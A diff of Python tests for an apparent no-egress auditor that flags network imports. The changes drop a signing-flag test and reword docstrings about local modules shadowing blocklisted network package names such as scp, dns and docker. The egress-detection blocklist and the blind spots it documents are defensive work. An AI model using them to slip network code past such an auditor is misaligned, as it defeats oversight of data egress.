         "[project]\nname = 'x'\nversion = '0'\n"
@@ -676,40 +746,39 @@ def test_held_out_library_in_pyproject_is_still_invisible(tmp_path):
     assert _egress_kinds(tmp_path) == set()
 
 
-def test_cli_covenant_flag_is_documented_as_ignored():
-    """The HMAC keyed by that file is gone. The flag remaining as if it
-    still signed would be the 2026-08-20 defect wearing a help string."""
+def test_no_command_takes_a_covenant_flag_and_no_function_a_covenant_argument():
+    """A flag or an argument that reads as if it signed would mislead the reader about what the signature rests on:
+    the signature is the one-time key given with `--key`. None of the four commands takes `--covenant`, and the
+    public functions take no covenant text."""
+    import inspect
     import os
     import subprocess
     import sys
+    from entrovouch import cbom, key_provenance, no_egress_auditor, sbom
+    for mod in (cbom, no_egress_auditor, sbom, key_provenance):
+        src = inspect.getsource(mod)
+        assert "covenant_text" not in src and "--covenant" not in src, mod.__name__
     env = dict(os.environ)
     env["PYTHONPATH"] = str(Path(__file__).resolve().parents[1])
-    r = subprocess.run(
-        [sys.executable, "-m", "entrovouch.no_egress_auditor", "--help"],
-        cwd=Path(__file__).resolve().parents[1],
-        env=env,
-        capture_output=True, text=True, encoding="utf-8", errors="replace",
-    )
-    assert r.returncode == 0
-    assert "IGNORED" in r.stdout
-    assert "Covenant text IS the key" not in r.stdout
-
+    for mod in ("no_egress_auditor", "cbom", "sbom"):
+        r = subprocess.run([sys.executable, "-m", f"entrovouch.{mod}", "--help"], cwd=Path(__file__).resolve().parents[1],
+                           env=env, capture_output=True, text=True, encoding="utf-8", errors="replace")
+        assert r.returncode == 0 and "--covenant" not in r.stdout and "Covenant text IS the key" not in r.stdout
 
 
 # --------------------------------------------------------------------------
-# LOCAL MODULES SHADOW INSTALLED PACKAGES — the precision cost of a longer list
+# LOCAL MODULES SHADOW INSTALLED PACKAGES: the precision cost of a longer list
 # --------------------------------------------------------------------------
 def test_a_local_module_is_not_a_network_import(tmp_path):
-    """🔴 THE FALSE POSITIVE THE 46 NEW NAMES CREATED, MEASURED BEFORE SHIPPING.
+    """A project's own top-level module is not a network import.
 
-    Extending the blocklist added ordinary English words as module names —
+    The blocklist contains ordinary English words as module names:
     `motor`, `docker`, `github`, `dns`, `scp`, `slack`, `consul`, `fabric`. A
-    robotics project with its own `motor.py` is not hypothetical, and it got
-    `import motor` reported as a network import. Four false positives in an
-    eight-file fixture, on exactly the kind of on-prem codebase this tool is for.
+    robotics project with its own `motor.py` is not hypothetical, and its
+    `import motor` must not be reported as a network import.
 
-    ⭐ SUPPRESSING THESE IS CORRECTNESS, NOT LENIENCY. A top-level `motor.py`
-    shadows any installed distribution of that name — Python's own resolution
+    SUPPRESSING THESE IS CORRECTNESS, NOT LENIENCY. A top-level `motor.py`
+    shadows any installed distribution of that name: Python's own resolution
     order, not a heuristic. Calling it a network import is factually wrong.
     """
     (tmp_path / "motor.py").write_text("def spin(): pass\n", encoding="utf-8")
@@ -721,11 +790,11 @@ def test_a_local_module_is_not_a_network_import(tmp_path):
 
 
 def test_shadowed_imports_are_disclosed_not_silently_dropped(tmp_path):
-    """⭐ A SUPPRESSED FINDING THE READER CANNOT SEE IS THE DEFECT THIS PACKAGE
+    """A SUPPRESSED FINDING THE READER CANNOT SEE IS THE FAILURE THIS PACKAGE
     COMPLAINS ABOUT, so the suppression is reported.
 
     This is what keeps the trade honest: a network client VENDORED into the tree
-    root is genuinely invisible to the finding list (an already-declared blind
+    root is genuinely invisible to the finding list (a declared blind
     spot), but its name still appears in `shadowed_imports` and in the markdown,
     where someone auditing the audit can see it.
     """
@@ -740,7 +809,7 @@ def test_shadowed_imports_are_disclosed_not_silently_dropped(tmp_path):
 
 def test_shadowing_does_not_weaken_real_detection(tmp_path):
     """The other direction. A tree with NO local module of that name must still
-    report the network import — the suppression must be conditional on the
+    report the network import: the suppression must be conditional on the
     shadowing file actually existing, not on the name being unusual."""
     _write(tmp_path, "app.py", "import motor\nimport stripe\n")
     assert "network-import" in _egress_kinds(tmp_path)
@@ -763,10 +832,10 @@ def test_a_file_named_after_the_module_it_imports_still_reports(tmp_path):
 
     A root-level `wandb.py` containing `import wandb` is a SELF-import, not a
     project supplying `wandb` to its other files. Treating it as shadowing
-    suppressed 20 real detections in this suite's own fixtures, which name each
-    fixture file after the module under test.
+    would suppress real detections, including in this suite's own fixtures,
+    which name each fixture file after the module under test.
 
-    ⭐ Over-suppression costs recall on exactly the class this tool exists to
+    Over-suppression costs recall on exactly the class this tool exists to
     catch, so the ambiguous case is given up and the unambiguous one (a
     DIFFERENT file importing the local module) is kept.
     """
